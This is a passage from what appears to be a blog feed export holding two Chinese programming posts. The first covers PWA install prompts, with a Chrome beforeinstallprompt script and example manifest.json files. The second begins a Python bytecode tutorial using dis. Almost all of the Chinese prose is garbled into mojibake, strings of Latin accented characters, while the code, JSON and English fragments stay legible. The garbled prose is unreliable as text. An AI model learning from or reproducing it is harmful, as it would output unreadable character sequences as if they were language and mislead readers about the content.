åƒä¸Šé¢çš„ç¨‹å¼ç¢¼å°±æ˜¯é‡å°è·¯å¾‘ä¸­å«æœ‰apiçš„ request åšå¿«å–ï¼Œé€™æ¨£åœ¨é›¢ç·šæ™‚ä¹Ÿå¯ä»¥åˆ©ç”¨ä»¥å‰å¿«å–ä½çš„ API responseã€‚
Workbox é‡å°é€™ç¨®å‹•æ…‹çš„å¿«å–æä¾›å¹¾ç¨®ç­–ç•¥ï¼Œåˆ†åˆ¥æ˜¯ï¼šstaleWhileRevalidateã€cacheFirstã€networkFirstã€networkOnly èˆ‡cacheOnlyï¼Œå…¶å¯¦çœ‹åå­—å°±å¯ä»¥å¤§æ¦‚ç†è§£ç­–ç•¥æ˜¯ä»€éº¼äº†ï¼Œæƒ³çŸ¥é“è©³ç´°çš„å…§å®¹å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶ï¼šWorkbox Strategiesã€‚
ç¸½ä¹‹è‡ªå¾æœ‰äº† Workbox ä¹‹å¾Œï¼ŒåŸºæœ¬ä¸Šå°±ä¸ç”¨è‡ªå·±æ‰‹å¯« SW äº†ï¼Œéƒ½é è‘—å®ƒæä¾›çš„ API ä»¥åŠåŠŸèƒ½å°±è¡Œäº†ï¼Œå°±å¯ä»¥è‡ªå‹•ç”¢ç”Ÿå‡ºç¬¦åˆéœ€æ±‚çš„ SWã€‚
Add to home screen banneræœ€å¾Œè¦ä¾†è«‡çš„æ˜¯ã€Œå®‰è£ PWAã€é€™ä¸€å¡Šï¼Œåœ¨ iOS Safari ä¸Šé¢åˆ¥ç„¡ä»–æ³•ï¼Œå°±åªèƒ½è‡ªå·±å«å‡ºé¸å–®ç„¶å¾Œé¸å–ã€ŒAdd to home screenã€ï¼Œå¯æ˜¯åœ¨ Android Chrome ä¸Šé¢ï¼Œå¦‚æœä½ ç¬¦åˆä¸€å®šçš„æ¢ä»¶ï¼ˆæœ‰è¨­ç½®mainfest.jsonä»¥åŠæœ‰è¨»å†Š Service Workerï¼‰ï¼Œå°±æœƒè‡ªå‹•å¹«ä½ è·³å‡ºä¸€å€‹å¯æ„›çš„ Install bannerã€‚
ï¼ˆåœ–ç‰‡ä¾†è‡ªï¼šChanges to Add to Home Screen Behaviorï¼‰
æ ¹æ“š Chrome ç‰ˆæœ¬çš„ä¸åŒï¼Œè¡Œç‚ºä¹Ÿæœ‰æ‰€ä¸åŒã€‚
åœ¨ Chrome 67ï¼ˆå«ï¼‰ä»¥å‰çš„ç‰ˆæœ¬ï¼Œå¦‚æœä½ åœ¨beforeinstallpromptäº‹ä»¶è£¡é¢æ²’æœ‰ç‰¹åˆ¥ç”¨preventDefault()ï¼Œæˆ–æ˜¯é¡¯å¼çš„å‘¼å«äº†prompt()ï¼Œå°±æœƒå‡ºç¾æœ€å·¦é‚Šé‚£å€‹é —å¤§çš„ A2HS bannerã€‚
ç„¶å¾Œåœ¨ Chrome 68ï¼ˆå«ï¼‰ä¹‹å¾Œçš„ç‰ˆæœ¬ï¼Œç„¡è«–ä½ åšäº†ä»€éº¼ï¼Œç³»çµ±éƒ½æœƒè‡ªå‹•å‡ºç¾é‚£å€‹ Mini-infobarï¼Œä½†å¦‚æœä½¿ç”¨è€…é—œæ‰çš„è©±ï¼Œè¦éš”ä¸‰å€‹æœˆæ‰æœƒå†å‡ºç¾ä¸€æ¬¡ï¼Œå¯¦åœ¨æ˜¯æœ‰å¤ ä¹…ã€‚
æ¥è‘—å‘¢ï¼Œä¸Šé¢é€™å…©å€‹ A2HS banner è·Ÿ Mini-infobarï¼Œä½¿ç”¨è€…é»æ“Šä¹‹å¾Œéƒ½æœƒå‡ºç¾æœ€å³é‚Šçš„ A2HS Dialogï¼Œæç¤ºä½¿ç”¨è€…è¦ä¸è¦å®‰è£ PWAã€‚
ä½†æ˜¯åœ¨ Chrome 68 ä»¥å¾Œï¼Œä½ ä¹Ÿå¯ä»¥åˆ©ç”¨ç¨‹å¼å»å‘¼å«beforeinstallpromptè£¡é¢æ‹¿åˆ°çš„event.prompt()æŠŠé€™å€‹ dialog é¡¯ç¤ºå‡ºä¾†ã€‚
è½èµ·ä¾†æœ‰é»è¤‡é›œå°å§ï¼Ÿ
å…ˆä¾†ä»‹ç´¹beforeinstallprompté€™å€‹ event å¥½äº†ï¼Œé€™å€‹ event åœ¨ä¸€åˆ‡éƒ½æº–å‚™å°±ç·’ï¼Œç¢ºèªä½ æ»¿è¶³æ¢ä»¶å¯ä»¥é¡¯ç¤º prompt çš„æ™‚å€™æœƒè¢«è§¸ç™¼ï¼Œæœƒå‚³ä¾†ä¸€å€‹ eventï¼Œä½ å¯ä»¥é˜»æ­¢é¡¯ç¤º promptï¼ŒæŠŠé€™å€‹ event å­˜èµ·ä¾†ï¼š
// æ­¤ç¯„ä¾‹ä¾†è‡ªä¸Šé¢çš„å®˜æ–¹æ–‡ä»¶let installPromptEvent;  window.addEventListener(&#x27;beforeinstallprompt&#x27;, (event) =&gt; &#123;  // Prevent Chrome &lt;= 67 from automatically showing the prompt  event.preventDefault();  // Stash the event so it can be triggered later.  installPromptEvent = event;  // Update the install UI to notify the user app can be installed  document.querySelector(&#x27;#install-button&#x27;).disabled = false;&#125;);

ç‚ºä»€éº¼è¦å­˜èµ·ä¾†å‘¢ï¼Ÿå› ç‚ºä½¿ç”¨è€…å¯èƒ½ä¸æƒ³ä¸€æ‰“é–‹ç¶²ç«™å°±çœ‹åˆ°é€™å€‹å½ˆçª—ï¼Œæˆ–è€…ä»–å¯èƒ½æ­£åœ¨çµå¸³çµæœä½ è·³é€™å€‹æ±è¥¿ä¾†å¹²æ“¾ä»–ï¼Œæ‰€ä»¥å…ˆæŠŠå®ƒå­˜èµ·ä¾†ï¼Œç­‰é©ç•¶çš„æ™‚æ©Ÿå†å‘¼å«installPromptEvent.prompt()ä¾†è·³å‡º Dialogã€‚
ä½†è¦æ³¨æ„çš„äº‹æƒ…æ˜¯ä½ ç›´æ¥å‘¼å«installPromptEvent.prompt()æ˜¯æ²’ç”¨çš„ï¼Œä½ å¿…é ˆè¦within a user gestureï¼Œæ„æ€å°±æ˜¯ä½ è¦æ”¾åœ¨æŒ‰éˆ•çš„ click äº‹ä»¶ï¼ˆæˆ–å…¶ä»–ç”±ä½¿ç”¨è€…è§¸ç™¼çš„äº‹ä»¶ï¼‰è£¡æ‰æœ‰æ•ˆï¼Œç›´æ¥å‘¼å«æ˜¯æ²’æœ‰ç”¨çš„ï¼Œè€Œä¸”æœƒçœ‹åˆ° console è·³å‡ºéŒ¯èª¤è¨Šæ¯ã€‚
æˆ‘ä¹‹å‰ä¸€åº¦å¾ˆå¥½å¥‡å®ƒæ˜¯æ€éº¼åšåˆ¤æ–·çš„ï¼Œå¾Œä¾†ç™¼ç¾åŸä¾†æœ‰event.isTrustedå¯ä»¥ç”¨ï¼Œå¯ä»¥åˆ¤æ–·ä¸€å€‹äº‹ä»¶æ˜¯ä¸æ˜¯è¢«ä½¿ç”¨è€…ä¸»å‹•è§¸ç™¼çš„ï¼Œåƒè€ƒè³‡æ–™ï¼šMDN - Event.isTrustedã€‚
ç¸½ä¹‹å‘¢ï¼Œå› ç‚ºåœ¨ä¸åŒç‰ˆæœ¬ä¸Šçš„ Chrome æœ‰ä¸åŒè¡Œç‚ºï¼Œæ‰€ä»¥æœ€å¾Œæˆ‘å€‘æ±ºå®šç”¨ä¸‹é¢çš„ç¨‹å¼ç¢¼é‡å°ä¸åŒç‰ˆæœ¬æœ‰ä¸åŒçš„åæ‡‰ï¼š
// æŠŠ event å­˜èµ·ä¾†var installPromptEvent  // è¦é¡¯ç¤º prompt çš„å»¶é²var showTime = 30 * 1000  window.addEventListener(&#x27;beforeinstallprompt&#x27;, function (e) &#123;  e.preventDefault()  installPromptEvent = e  var data = navigator.userAgent.match(/Chrom(e|ium)\\/([0-9]+)\\./)  var version = (data &amp;&amp; data.length &gt;= 2) ? parseInt(data[2], 10) : null  if (version &amp;&amp; installPromptEvent.prompt) &#123;      // å»¶é²ä¸€æ®µæ™‚é–“æ‰é¡¯ç¤º prompt    setTimeout(function() &#123;        // å¦‚æœ Chrome ç‰ˆæœ¬æ˜¯ 67ï¼ˆå«ï¼‰ä»¥ä¸‹ï¼Œå¯ä»¥ç›´æ¥å‘¼å«        if (version &lt;= 67) &#123;            installPromptEvent.prompt()            return        &#125;          // å¦å‰‡çš„è©±å¿…é ˆé€é user action ä¸»å‹•è§¸ç™¼        // é€™é‚Šå¹« #root åŠ ä¸Š event listenerï¼Œä»£è¡¨é»æ“Šè¢å¹•ä»»ä½•ä¸€è™•éƒ½æœƒé¡¯ç¤º prompt        document.querySelector(&#x27;#root&#x27;).addEventListener(&#x27;click&#x27;, addToHomeScreen)        &#125;, showTime)  &#125;&#125;);  function addToHomeScreen(e) &#123;    if (installPromptEvent) &#123;        installPromptEvent.prompt()        installPromptEvent = null        document.querySelector(&#x27;#root&#x27;).removeEventListener(&#x27;click&#x27;, addToHomeScreen)     &#125;&#125;

å¦‚æœæ˜¯ 67 ä»¥ä¸‹ï¼Œç›´æ¥å‘¼å«å°±å¯ä»¥é¡¯ç¤º promptï¼Œå¦å‰‡çš„è©±é‚„è¦å†ä¸€æ­¥ï¼Œè¦åŠ å€‹ event listener æ‰è¡Œï¼Œè€Œæˆ‘å€‘ä¹Ÿé¸æ“‡å»¶é² 30 ç§’æ‰é¡¯ç¤ºã€‚
å‡ºä¹æ„æ–™åœ°ï¼Œé€™æ¨£ä¸€å€‹å°æ”¹å‹•å¸¶ä¾†é©šäººçš„æˆé•·ï¼ŒåŸæœ¬ä¸€å¤©å¤§æ¦‚æ‰ 20ã€30 å€‹äººå®‰è£ PWAï¼Œç¶“éé€™æ¨£èª¿æ•´ä¹‹å¾Œç¬é–“è®Šæˆå…«åˆ°åå€ï¼Œçœ‹åˆ° GA çš„é‚£å€‹çµ±è¨ˆåœ–æˆ‘ä¹Ÿåš‡äº†ä¸€è·³ï¼Œæ²’æƒ³åˆ°æ•ˆæœé€™éº¼å¥½ã€‚
èˆ‡å…¶ä¸€ç›´ç©æ¥µåœ°è¦åˆ¥äººå¿«é»å®‰è£ PWAï¼Œé‚„ä¸å¦‚åªè¦æ±‚çœŸçš„å°ä½ ç”¢å“æœ‰èˆˆè¶£ï¼ˆåœç•™è¶…é 30 ç§’é˜ï¼‰çš„äººã€‚
manifest è§€æ‘©æœ€å¾Œæˆ‘å€‘ä¾†çœ‹çœ‹å¹¾å€‹çŸ¥åçš„ PWA éƒ½æ˜¯æ€éº¼å¯«ä»–å€‘çš„manifest.jsonã€‚
ç¬¬ä¸€å€‹æ˜¯ PWA ç•Œä¸­å¾ˆæœ‰åçš„ flipkartï¼š
&#123;    &quot;name&quot;: &quot;Flipkart Lite&quot;,    &quot;short_name&quot;: &quot;Flipkart Lite&quot;,    &quot;icons&quot;: [        &#123;            &quot;src&quot;: &quot;https://img1a.flixcart.com/www/linchpin/batman-returns/logo_lite-cbb3574d.png&quot;,            &quot;sizes&quot;: &quot;192x192&quot;,            &quot;type&quot;: &quot;image/png&quot;        &#125;    ],    &quot;gcm_sender_id&quot;: &quot;656085505957&quot;,    &quot;gcm_user_visible_only&quot;: true,    &quot;start_url&quot;: &quot;/?start_url=homescreenicon&quot;,    &quot;permissions&quot;: [        &quot;gcm&quot;    ],    &quot;orientation&quot;: &quot;portrait&quot;,    &quot;display&quot;: &quot;standalone&quot;,    &quot;theme_color&quot;: &quot;#2874f0&quot;,    &quot;background_color&quot;: &quot;#2874f0&quot;&#125;

å†ä¾†æ˜¯é¼é¼å¤§åçš„ twitterï¼š
&#123;  &quot;background_color&quot;: &quot;#ffffff&quot;,  &quot;description&quot;: &quot;It&#x27;s what&#x27;s happening. From breaking news and entertainment, sports and politics, to big events and everyday interests.&quot;,  &quot;display&quot;: &quot;standalone&quot;,  &quot;gcm_sender_id&quot;: &quot;49625052041&quot;,  &quot;gcm_user_visible_only&quot;: true,  &quot;icons&quot;: [    &#123;      &quot;src&quot;: &quot;https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png&quot;,      &quot;sizes&quot;: &quot;192x192&quot;,      &quot;type&quot;: &quot;image/png&quot;    &#125;,    &#123;      &quot;src&quot;: &quot;https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png&quot;,      &quot;sizes&quot;: &quot;512x512&quot;,      &quot;type&quot;: &quot;image/png&quot;    &#125;  ],  &quot;name&quot;: &quot;Twitter&quot;,  &quot;share_target&quot;: &#123;    &quot;action&quot;: &quot;compose/tweet&quot;,    &quot;params&quot;: &#123;      &quot;title&quot;: &quot;title&quot;,      &quot;text&quot;: &quot;text&quot;,      &quot;url&quot;: &quot;url&quot;    &#125;  &#125;,  &quot;short_name&quot;: &quot;Twitter&quot;,  &quot;start_url&quot;: &quot;/&quot;,  &quot;theme_color&quot;: &quot;#ffffff&quot;,  &quot;scope&quot;: &quot;/&quot;&#125;

æœ€å¾Œå‰‡æ˜¯ Google I&#x2F;O 2018ï¼š
&#123;  &quot;name&quot;: &quot;Google I/O 2018&quot;,  &quot;short_name&quot;: &quot;I/O 2018&quot;,  &quot;start_url&quot;: &quot;./?utm_source=web_app_manifest&quot;,  &quot;display&quot;: &quot;standalone&quot;,  &quot;theme_color&quot;: &quot;#6284F3&quot;,  &quot;background_color&quot;: &quot;#6284F3&quot;,  &quot;icons&quot;: [&#123;    &quot;src&quot;: &quot;static/images/homescreen/homescreen57.png&quot;,    &quot;sizes&quot;: &quot;57x57&quot;,    &quot;type&quot;: &quot;image/png&quot;  &#125;, &#123;    &quot;src&quot;: &quot;static/images/homescreen/homescreen114.png&quot;,    &quot;sizes&quot;: &quot;114x114&quot;,    &quot;type&quot;: &quot;image/png&quot;  &#125;, &#123;    &quot;src&quot;: &quot;static/images/homescreen/homescreen128.png&quot;,    &quot;sizes&quot;: &quot;128x128&quot;,    &quot;type&quot;: &quot;image/png&quot;  &#125;, &#123;    &quot;src&quot;: &quot;static/images/homescreen/homescreen144.png&quot;,    &quot;sizes&quot;: &quot;144x144&quot;,    &quot;type&quot;: &quot;image/png&quot;  &#125;, &#123;    &quot;src&quot;: &quot;static/images/homescreen/homescreen192.png&quot;,    &quot;sizes&quot;: &quot;192x192&quot;,    &quot;type&quot;: &quot;image/png&quot;  &#125;, &#123;    &quot;src&quot;: &quot;static/images/homescreen/homescreen512.png&quot;,    &quot;sizes&quot;: &quot;512x512&quot;,    &quot;type&quot;: &quot;image/png&quot;  &#125;],  &quot;prefer_related_applications&quot;: false,  &quot;related_applications&quot;: [&#123;    &quot;platform&quot;: &quot;play&quot;,    &quot;id&quot;: &quot;com.google.samples.apps.iosched&quot;  &#125;],  &quot;gcm_sender_id&quot;: &quot;103953800507&quot;&#125;

æˆ‘æ»¿å–œæ­¡è§€å¯Ÿåˆ¥äººå®¶çš„é€™äº›æ±è¥¿ï¼Œå› ç‚ºä½ æœƒç™¼ç¾å¾ˆå¤šä½ æŸ¥è³‡æ–™æ™‚éºæ¼æˆ–æ˜¯æ ¹æœ¬æ‰¾ä¸åˆ°çš„è³‡è¨Šï¼Œè€Œä¸”é€™äº›çœ‹ä¹…äº†ä½ ä¹Ÿæœƒæœ‰å€‹æ¦‚å¿µï¼ŒçŸ¥é“å“ªäº›å±¬æ€§ç‰¹åˆ¥å¸¸ç”¨ï¼Œé™¤äº†manifest.jsonä»¥å¤–ï¼Œä¹Ÿå¯ä»¥åƒè€ƒ html è£¡é¢çš„ tagï¼Œä¸€æ¨£èƒ½å­¸ç¿’åˆ°å¾ˆå¤šã€‚
çµè«–å‰é™£å­åœ¨èˆ‡ PWA å¥®æˆ°ä»¥åŠè¢« PM çš„å¤¾æ“Šä¹‹ä¸‹ï¼Œæœé›†äº†å¾ˆå¤šè·Ÿ PWA æœ‰é—œçš„è³‡æ–™ï¼Œä¹Ÿåƒè€ƒäº†è¨±å¤šå¾ˆæœ‰ç”¨çš„æ–‡ç« ï¼ŒçœŸå¿ƒæ„Ÿè¬é‚£äº›å‰è¼©å€‘çš„åˆ†äº«ï¼Œæ‰èƒ½é¿å…å¾Œäººè¸©ä¸€å¤§å †å‘ã€‚
é›–ç„¶åœ¨ iOS ä¸Šçš„é«”é©—å·®äº†é»ï¼Œä½†æ•´é«”ä¾†èªªæˆ‘é‚„æ˜¯å¾ˆçœ‹å¥½ PWA çš„ç™¼å±•ï¼Œç¬¬ä¸€å€‹æ˜¯ Google å¼·åŠ›æ¨å‹•ï¼Œç¬¬äºŒå€‹æ˜¯ç€è¦½å™¨çš„æ”¯æ´åº¦æ„ˆä¾†æ„ˆé«˜ï¼Œå°±åƒæˆ‘ä¸Šé¢èªªçš„ï¼ŒiOS Safari å·²ç¶“æœ‰æ…¢æ…¢æŠŠ Bug çµ¦ä¿®æ‰äº†ï¼Œä¹‹å¾Œçš„åŠŸèƒ½æœƒæ¯”è¼ƒå®Œæ•´ä¸€äº›ã€‚
å†è€…ï¼ŒPWA çš„ä½¿ç”¨è€…é«”é©—æ˜¯å¾ˆä¸éŒ¯çš„ï¼Œæœ‰å¯ä»¥æ¥å—çš„é€Ÿåº¦ä»¥åŠ Web çš„å½ˆæ€§ï¼Œé‡é»æ˜¯ä¸ç”¨å» Google Play ç‰¹åœ°ä¸‹è¼‰å°±å°‘äº†ä¸€é“è½‰æ›çš„é–€æª»ï¼ˆé›–ç„¶é‚„æ˜¯æœ‰å®‰è£ PWA çš„é–€æª»å°±æ˜¯äº†ï¼Œä½†æˆ‘è¦ºå¾—æ¯”è¼ƒå®¹æ˜“ä¸€äº›ï¼‰ï¼Œè€Œ Chrome ä¹Ÿæä¾›äº†è¨±å¤šæ©Ÿåˆ¶çµ¦ PWAï¼Œå¸Œæœ›ä½¿ç”¨è€…èƒ½å®‰è£ PWA åœ¨æ‰‹æ©Ÿä¸Šã€‚
ç¸½ä¹‹å‘¢ï¼Œé€™ç¯‡ä¸»è¦æ˜¯è·Ÿå¤§å®¶åˆ†äº«æˆ‘åœ¨åš PWA æ™‚å€™çš„ä¸€äº›å°å°å¿ƒå¾—ï¼Œå¦‚æœä½ ä¹Ÿæœ‰ä»€éº¼å¿ƒå¾—æ­¡è¿åœ¨åº•ä¸‹ç•™è¨€è·Ÿæˆ‘åˆ†äº«ï¼Œæ„Ÿè¬ã€‚
å»¶ä¼¸é–±è®€èˆ‡åƒè€ƒè³‡æ–™ï¼š

Changes to Add to Home Screen Behavior
Progressive Web App Splash Screens
Few Tips That Will Make Your PWA on iOS Feel Like Native
PWAs are coming to iOS 11.3: Cupertino, we have a problem
Progressive Web App æœƒæ˜¯æœªä¾†è¶¨å‹¢å—ï¼Ÿ
PWA case studies
A Pinterest Progressive Web App Performance Case Study

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>pwa</tag>
      </tags>
  </entry>
  <entry>
    <title>æ­¡æ¨‚å­¸ Python ä½å…ƒçµ„ç¢¼(byte code)</title>
    <url>/2017/12/01/pycon-2017-huan-le-xue-python-wei-yuan-zu-ma-byte-code/</url>
    <content><![CDATA[èª°é©åˆé–±è®€é€™ç¯‡æ–‡ç« ï¼šåˆéšåˆ°ä¸­éš python åŸºç¤çš„ç¨‹å¼è¨­è¨ˆå¸«ï¼Œæƒ³æ·±å…¥æ·ºå‡ºçš„äº†è§£ python çš„ä½å…ƒçµ„ç¢¼ï¼ˆbytecodeï¼‰
PyCon 2016 æœ‰ä¸€å ´å¾ˆæœ‰è¶£çš„æ¼”è¬›ï¼Œå…§å®¹æ˜¯é—œæ–¼ä»‹ç´¹ Python ä½å…ƒçµ„ç¢¼ï¼ˆPython Bytecodeï¼‰ï¼Œæ¼”è¬›åç¨±å°±ç¨±ç‚º â€œPlaying Bytecode with Pythonâ€ã€‚é€™å ´æ¼”è¬›æœ‰è¶£çš„åœ°æ–¹ï¼Œåœ¨æ–¼å®ƒå®Œå…¨è¡¨é”äº† Python ç¤¾ç¾¤çš„ç²¾ç¥ï¼Œä¹Ÿå°±æ˜¯ä»¥ â€œMonty Pythonâ€ çš„æ–¹å¼ä¾†è¡¨é”ä¸€å€‹æŠ½è±¡è¤‡é›œçš„æ¦‚å¿µã€‚åœ¨æœ‰å¦‚å‹èŠèˆ‡å“ˆå°å…©äººä¸€æ­ä¸€å”±çš„æ–¹å¼ï¼Œå‚³éäº†å¦‚è«–èªèˆ¬è—‰ç”±å­”å­å’Œå¼Ÿå­å€‘çš„å°è©±å‚³éäº†å„’é“çš„ç²¾ç¥ï¼Œæˆ–æŸæ‹‰åœ–å’Œè‰²è«¾èŠ¬ä»¥èˆ‡è˜‡æ ¼æ‹‰åº•å°è©±éŒ„çš„æ–¹å¼ä¾†é—¡è¿°çŸ¥è­˜çš„é€²ç¨‹ã€‚   

ä¸éå…¶å¯¦æ•´ç¯‡æ¼”è¬›ï¼Œä¸¦æ²’æœ‰å‚³éå¦‚æ­¤æ·±å¥§çš„å­¸å•ã€‚å¤šåŠæ˜¯å¾å¤§ç´„ 30 åˆ†é˜çš„æ¼”è¬›ä¸­ï¼Œç™¼ç¾è‡ªå·±æ‘¸ç´¢å­¸ç¿’ç¨‹å¼çš„å½±å­ã€‚ä¾‹å¦‚ï¼Œå› ç‚ºæ¯«ç„¡é ­ç·’ï¼Œåªå¥½ç”¨å˜—è©¦éŒ¯èª¤æ³•ï¼Œå¾éŒ¯èª¤ä¸­å­¸ç¿’ã€‚èª å¦‚å„ä½æœƒåœ¨å½±ç‰‡ä¸­çœ‹åˆ°çš„ï¼Œåœ¨æ¯«ç„¡é ­ç·’çš„æƒ…æ³ä¸‹ï¼Œéš¨æ©Ÿ import ä¸€å€‹çœ‹èµ·ä¾†å¾ˆç›¸é—œçš„æ¨¡çµ„ï¼Œç„¶å¾Œé€ä¸€æª¢æŸ¥å«Œç–‘ functionï¼ˆå¦‚å…¶ä¸­ä¸€ä½è¬›è€…åœ¨æ¼”è¬›ä¸­æ‰€è¡¨æ¼”çš„ï¼Œæœ‰è‘—é›™åº•ç·šé–‹é ­çš„ function é€šå¸¸æ˜¯ç§˜å¯† function å¦‚ __code__ï¼‰ç­‰ç­‰ã€‚æ›¾ç¶“èˆ‡é ‘å›ºçš„é›»è…¦å¥®é¬¥å¥½å¹¾å°æ™‚ä»¥ä¸Šï¼Œå»åˆæ¨‚æ­¤ä¸ç–²çš„ç·¨ç¨‹è€…ï¼Œçœ‹å®Œæ‡‰è©²æœƒæœ‰ï¼ˆåƒæˆ‘é€™æ¨£å¾ˆéœçš„ç·¨ç¨‹è€…ï¼‰â€œæœƒå¿ƒä¸€ç¬‘â€œ æˆ–ï¼ˆé§­å®¢ç´šçš„ç·¨ç¨‹è€…ï¼‰â€œå“„å ‚å¤§ç¬‘â€ çš„çµæœã€‚  
æˆ‘æ­¤ç¯‡çš„æ•™å­¸æ–‡ç« çš„å…§å®¹å¤§è‡´ä»¥æ­¤ç¯‡æ¼”è¬›ç‚ºä¸»ï¼Œå¦å¤–å†å¢åŠ ä¸€äº› PyCon 2017 å¹´ä¸­å¦ä¸€å ´æ¼”è¬›ï¼šåˆ©ç”¨ python 3.6 æ–°çš„ frame evaluation API ä¾†æ‰“é€ æ›´å¿«æ›´å¼·çš„é™¤éŒ¯å™¨ã€‚ç”¨æ­¤ç¯‡æ¼”è¬›ä¾†ç°¡è¿°ä½å…ƒçµ„ç¢¼å¯èƒ½çš„å¯¦éš›æ‡‰ç”¨ï¼Œå¸Œæœ›å¤§å®¶åœ¨æ­¡æ¨‚è§€çœ‹å½±ç‰‡ä¹‹é¤˜ï¼Œä¹Ÿèƒ½å¤ å¢é•·çŸ¥è­˜ã€‚é¦–å…ˆï¼Œä»€éº¼æ˜¯ä½å…ƒçµ„ç¢¼ï¼Œæˆ‘å€‘å¯ä»¥ç”¨ä»¥ä¸‹çš„ add function ç‰©ä»¶ä¾†åšè§£é‡‹ã€‚
def add(a, b):  return a + b

èª å¦‚å¤§å®¶éƒ½èƒ½ç…ç…ä¸Šå£çš„äº‹å¯¦ï¼Œâ€œpython ç¨‹å¼è£¡éƒ½æ˜¯ç‰©ä»¶â€ï¼Œæ‰€ä»¥ add æœ¬èº«æ˜¯ä¸€å€‹ function ç‰©ä»¶ã€‚è‡³æ–¼ add æœ¬èº«åŸ·è¡Œçš„é‚è¼¯ï¼Œæˆ‘å€‘å¯ä»¥å­˜å– add ç‰©ä»¶çš„ __code__ å±¬æ€§è€Œå¾—åˆ°å·²ç·¨è­¯å®Œæˆçš„ Code ç‰©ä»¶ã€‚è€Œåç‚º add çš„ function ç‰©ä»¶ï¼Œæ‰€ç·¨è­¯è€Œæˆçš„ä½å…ƒçµ„ç¢¼ï¼Œå‰‡å¯ä»¥è—‰ç”±å­˜å–å…¶ Code ç‰©ä»¶çš„ co_code æˆå“¡è€Œå¾—ã€‚å…¶çµæœä»¥ byte string è¡¨ç¤ºå¦‚ä¸‹ï¼š
add.__code__.co_code




b&#39;|\x00\x00|\x01\x00\x17S&#39;

æˆ‘å€‘å¯ä»¥åˆ©ç”¨ list comprehension æŠŠä½å…ƒçµ„ç¢¼è½‰æˆåé€²ä½çš„æ•´æ•¸ä¾†çœ‹ã€‚ä¸éå°±ç®—æŠŠ byte ç¿»æˆæ•´æ•¸ä¾†çœ‹ï¼Œä»èˆŠæ˜¯ä¸€é ­éœ§æ°´ã€‚
list(add.__code__.co_code)




[124, 0, 0, 124, 1, 0, 23, 83]

çœ‹ä¾†æˆ‘å€‘éœ€è¦ä¸€å€‹è§£è­¯å™¨ä¾†ç‚ºæˆ‘å€‘ç¿»è­¯ä¸Šé¢ç¥ç§˜çš„å¯†ç¢¼ã€‚å¹¸å¥½ python çš„é–‹ç™¼è€…å€‘å¾ˆä½›å¿ƒçš„æä¾›äº† dis æ¨¡çµ„ã€‚åªè¦ import dis ï¼ˆå¯åˆ¥æ‰‹èª¤ï¼Œæ‰“æˆ import thisï¼‰ä¸¦å‘¼å«äº†åŒåçš„æ¨¡çµ„æ–¹æ³•ï¼Œä¾†ç‚ºæˆ‘å€‘æ­é–‹ç¥ç§˜çš„é¢ç´—ã€‚
import disdis.dis(add)

  2           0 LOAD_FAST                0 (a)
              3 LOAD_FAST                1 (b)
              6 BINARY_ADD
              7 RETURN_VALUE

python ç›´è­¯å™¨å¯ä»¥çœ‹æˆä¸€å€‹åˆ©ç”¨å †ç–Šï¼ˆstackï¼‰ä¾†å¯¦è¸ä½å…ƒçµ„ç¢¼åŸ·è¡Œçš„è™›æ“¬æ©Ÿå™¨ï¼Œå…¶ä½œç”¨æ–¹å¼å’ŒçœŸå¯¦çš„ä¸­å¤®è™•ç†å–®å…ƒï¼ˆCPUï¼‰å¾ˆç›¸åƒï¼Œåªä¸éæ˜¯ç”¨è»Ÿé«”å»æå–ä¸¦åŸ·è¡Œ python ç›´è­¯å™¨å®šç¾©çš„ä½å…ƒçµ„ç¢¼ï¼Œè€Œéèˆ‡ä½œæ¥­ç³»çµ±å’Œç¡¬é«”ç›¸ä¾çš„æ©Ÿæ¢°ç¢¼ã€‚æ‰€ä»¥ dis.dis çš„è¼¸å‡ºå¯ä»¥çœ‹æˆæ˜¯ä¸€å€‹ä½å…ƒçµ„ç¢¼åŸ·è¡Œç‹€æ…‹çš„æ­·ç¨‹ã€‚é€™å€‹è¼¸å‡ºç¸½å…±æœ‰å…­å€‹æ¬„ä½ï¼š
é¦–å…ˆç¬¬ä¸€å€‹æ¬„ä½æ˜¯åŸå§‹ç¢¼çš„åˆ—æ•¸ã€‚åœ¨é€™è£¡å°±æ˜¯åŸå§‹ç¢¼ç¬¬äºŒåˆ—ï¼Œä¹Ÿå°±æ˜¯ return a + b é€™è¡Œç¨‹å¼ç¢¼ã€‚ä¸‹ä¸€å€‹æ¬„ä½ï¼Œå…¨éƒ¨éƒ½æ˜¯ç©ºç™½çš„ï¼Œå‰‡æ˜¯ç”¨ä¾†æ¨™ç¤ºä¸€äº›ç¬¦è™Ÿï¼Œå¦‚ conditional jump (if-else)ï¼Œæˆ‘å€‘æœƒåœ¨å¾Œé¢çš„å¯¦éš›ä¾‹å­çœ‹åˆ°é€™å€‹æ¬„ä½çš„è¼¸å‡ºã€‚ç¬¬ä¸‰å€‹æ¬„ä½å‰‡æ˜¯ä½å…ƒçµ„ç¢¼çš„ä½ç§»ã€‚ç¬¬å››å€‹æ¬„ä½å‰‡æ˜¯ä½å…ƒçµ„ç¢¼æŒ‡ä»¤çš„åç¨±ã€‚ç¬¬äº”å€‹æ¬„ä½ï¼Œå‰‡æ˜¯ 0 é–‹å§‹çš„ç´¢å¼•å€¼ï¼Œç”¨ä¾†è®€å– python å †ç–Šï¼ˆvalue stackï¼‰ä½å…ƒçµ„ç¢¼æŒ‡ä»¤çš„å¼•æ•¸ã€‚æœ€å¾Œä¸€å€‹æ¬„ä½å‰‡æ˜¯åŸå§‹ç¢¼ä¸­ç›¸å°æ‡‰çš„è®Šæ•¸ç¬¦è™Ÿã€‚  
